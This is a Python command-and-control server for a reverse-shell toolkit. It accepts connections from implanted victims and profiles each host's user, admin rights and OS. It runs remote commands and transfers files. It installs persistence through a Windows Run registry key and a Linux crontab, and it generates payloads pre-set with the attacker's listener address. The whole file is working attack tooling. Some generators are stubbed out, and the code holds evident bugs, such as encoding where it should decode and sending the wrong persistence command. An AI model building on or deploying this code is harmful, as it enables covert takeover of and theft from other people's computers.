import socket
import threading
import time
import random
import string
import os
import os.path
import shutil
import subprocess
import base64
from datetime import datetime
from prettytable import PrettyTable
from functions.transfer import upload_file, download_file
from functions.smtp import email_handler

# Display a banner when the program starts
def banner():
    print(".-..---..---, .---..---..---. .-..-..---..---.  ")
    print("| || |   / /   \ \ | |- | |-<  \  / | |- | |-<  ")
    print("`-'`---'`---' `---'`---'`-'`-'  `'  `---'`-'`-' ")

# Receive and decode a response from the target
def comm_in(targ_id):
    print('[+] Awaiting response...')
    response = targ_id.recv(1024).decode()
    response = base64.b64encode(response)
    response = response.decode().strip()
    return response

# Encode and send a message to the target
def comm_out(targ_id, message):
    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf8'))
    targ_id.send(message)

# Send a termination signal to the target
def kill_sig(targ_id, message):
    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf8'))
    targ_id.send(message)

# Handle communication with a specific target
def target_comm(targ_id, targets, num):
    while True:
        message = input(f'{targets[num][3]}/{targets[num][1]}#> ')
        if len(message) == 0:
            continue
        if message == 'help':
            pass
        elif message[:7] == 'upload ':
            file_name = message[7:]
            try:
                if os.path.exists(file_name):
                    upload_file(targ_id, file_name)
                else:
                    print('[-] File does not exist on the local machine.')
            except Exception as e:
                print(e)
        elif message[:9] == 'download ':
            file_name = message[9:]
            file_name = os.path.basename(file_name)
            print(f'[+] Attempting to download {file_name}.')
            download_file(targ_id, file_name)
        else:
            comm_out(targ_id, message)
            if message == 'exit':
                message = base64.b64encode(message.encode())
                targ_id.send(message)
                targ_id.close()
                targets[num][7] = 'Dead'
                break
            if message == 'background':
                break
            if message == 'help':
                pass
            if message == 'persist':
                payload_name = input('[+] Enter the name of the payload to add to persistence: ')
            if targets[num][6] == 1:
                # Persistence for Windows
                persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
                persist_command_1 = base64.b64encode(persist_command_1.encode())
                targ_id.send(persist_command_1.encode())
                persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
                persist_command_2 = base64.b64encode(persist_command_1.encode())
                targ_id.send(persist_command_2.encode())
                print('[+] Run this command to clean up the registry: \nreg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v screendoor /f')
            if targets[num][6] == 2:
                # Persistence for Linux
                persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
                targ_id.send(persist_command.encode())
                print('[+] Run this command to clean up the crontab: \n crontab -r')
            else:
                response = comm_in(targ_id)
                if response == 'exit':
                    print('[-] The client has terminated the session.')
                    targ_id.close()
                    break
                print(response)

# Listen for incoming connections from targets
def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print('[+] Awaiting connection from client...')
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()

# Handle connections from multiple targets
def comm_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            key_check = remote_target.recv(1024).decode()
            key_check = base64.b64decode(key_check).decode()
            if key_check == ran_payload_key:
                # Retrieve and decode client information
                username = remote_target.recv(1024).decode()
                username = base64.b64decode(username).decode()
                admin = remote_target.recv(1024).decode()
                admin = base64.b64decode(admin).decode()
                op_sys = remote_target.recv(1024).decode()
                op_sys = base64.b64decode(op_sys).decode()
                if email_gen == 1:
                    email_format = f'{remote_ip[0]}'
                    email_handler(email_format)
                admin_val = 'Yes' if admin == 1 or username == 'root' else 'No'
                pay_val = 1 if 'Windows' in op_sys else 2
                cur_time = time.strftime("%H:%M:%S", time.localtime())
                date = datetime.now()
                time_record = (f"{date.month}/{date.day}/{date.year} {cur_time}")
                host_name = socket.gethostbyaddr(remote_ip[0])
                if host_name is not None:
                    targets.append([remote_target, f'{host_name[0]}@{remote_ip[0]}', time_record, username, admin_val, op_sys, pay_val, 'Active'])
                    print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Enter command#> ', end="")
                else:
                    targets.append([remote_target, remote_ip[0], time_record, username, admin_val, op_sys, pay_val, 'Active'])
                    print(f'\n[+] Connection received from {remote_ip[0]}\n' + 'Enter command#> ', end="")
            else:
                remote_target.close()
        except:
            pass

# Generate a Windows-compatible Python payload
def winplant():
    ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{ran_name}.py'
    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}\\winplant.py'):
        shutil.copy('winplant.py', file_name)
    else:
        print('[-] winplant.py file not found.')
    # Replace placeholders in the payload with actual values
    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()
    with open(file_name) as f:
        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()
    with open(file_name) as f:
        new_key = f.read().replace('INPUT_KEY_HERE', ran_payload_key)
    with open(file_name, 'w') as f:
        f.write(new_key)
        f.close()
    if os.path.exists(f'{file_name}'):
        print(f'[+] {file_name} saved to {check_cwd}')
    else:
        print('[-] Some error occurred with generation. ')

# Generate a Linux-compatible Python payload
def linplant():
    # Similar to winplant() but for Linux systems
    pass  # Implementation omitted for brevity

# Generate a Windows executable payload
def exeplant():
    # Similar to winplant() but compiles payload to an executable
    pass  # Implementation omitted for brevity

# Generate a PowerShell payload with a web server
def pshell_cradle():
    # Generates and encodes a PowerShell command for payload delivery
    pass  # Implementation omitted for brevity

# Display help menu
def help():
    print('''
    Menu Commands
    listeners -g                  -->  Generate a new listener
    winplant py                   -->  Generate a Windows Compatible Python Payload
    linplant py                   --> Generate a Linux Compatible Python Payload
    exeplant                      --> Generate an executable payload for Windows
    sessions -l                   --> List sessions
    sessions -i <val>             --> Enter a new session
    kill <val>                    --> Kills an active session
    email_gen -e                  --> Enables Email Notifications
    email_gen -d                  --> Disables Email Notifications

    Session Commands
    background                    --> Backgrounds the current session
    exit                          --> Terminates the current session
    upload /path/to/file          --> Uploads File
    download /path/to/file        --> Downloads File
    ''')

# Main program entry point
if __name__ == '__main__':
    email_gen = 0  # Email notifications disabled by default
    ran_payload_key = (''.join(random.choices(string.ascii_lowercase, k=12)))  # Generate session key
    print(f'[+] Key for this session is {ran_payload_key}')
    targets = []  # List of connected targets
    listener_counter = 0  # Keep track of listeners
    banner()  # Display banner
    kill_flag = 0  # Flag to terminate listeners
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a socket
    while True:
        try:
            command = input('Enter command#> ')
            if command == 'email_gen -e':
                email_gen = 1
            if command == 'email_gen -d':
                email_gen = 0
            if command == 'help':
                help()
            if command == 'exit':
                quit_message = input('Ctrl-C\n[+] Do you really want to quit? (y/n)').lower()
                if quit_message == 'y':
                    tar_length = len(targets)
                    for target in targets:
                        if target[7] == 'Dead':
                            pass
                        else:
                            comm_out(target[0], 'exit')
                    kill_flag = 1
                    if listener_counter > 0:
                        sock.close()
                    break
            if command == 'listeners -g':
                host_ip = input('[+] Enter the IP to listen on: ')
                host_port = input('[+] Enter the port to listen: ')
                listener_handler()
                listener_counter += 1
            if command == 'pshell_shell':
                pshell_cradle()
            if command == 'winplant py':
                if listener_counter > 0:
                    winplant()
                else:
                    print('[-] You cannot generate a payload without an active listener.')
            if command == 'linplant py':
                if listener_counter > 0:
                    linplant()
                else:
                    print('[-] You cannot generate a payload without an active listener.')
            if command == 'exeplant':
                if listener_counter > 0:
                    exeplant()
                else:
                    print('[-] You cannot generate a payload without an active listener.')
            if command.split(" ")[0] == 'kill':
                try:
                    num = int(command.split(" ")[1])
                    targ_id = (targets[num])[0]
                    if (targets[num])[7] == 'Active':
                        kill_sig(targ_id, 'exit')
                        targets[num][7] = 'Dead'
                        print(f'[+] Session {num} terminated.')
                    else:
                        print('[-] You cannot interact with a dead session.')
                except (IndexError, ValueError):
                    print(f'[-] Session {num} does not exist.')
            if command.split(" ")[0] == 'sessions':
                session_counter = 0
                if command.split(" ")[1] == '-l':
                    myTable = PrettyTable()
                    myTable.field_names = ['Session', 'Status', 'Username', 'Admin', 'Target', 'Operating System', 'Check-In Time']
                    myTable.padding_width = 3
                    for target in targets:
                        myTable.add_row([session_counter, target[7], target[3], target[4], target[1], target[5], target[2]])
                        session_counter += 1
                    print(myTable)
                if command.split(" ")[1] == '-i':
                    try:
                        num = int(command.split(" ")[2])
                        targ_id = (targets[num])[0]
                        if (targets[num])[7] == 'Active':
                            target_comm(targ_id, targets, num)
                        else:
                            print('[-] You cannot interact with a dead session.')
                    except IndexError:
                        print(f'[-] Session {num} does not exist.')
        except KeyboardInterrupt:
            quit_message = input('Ctrl-C\n[+] Do you really want to quit? (y/n)').lower()
            if quit_message == 'y':
                tar_length = len(targets)
                for target in targets:
                    if target[7] == 'Dead':
                        pass
                    else:
                        comm_out(target[0], 'exit')
                kill_flag = 1
                if listener_counter > 0:
                    sock.close()
                break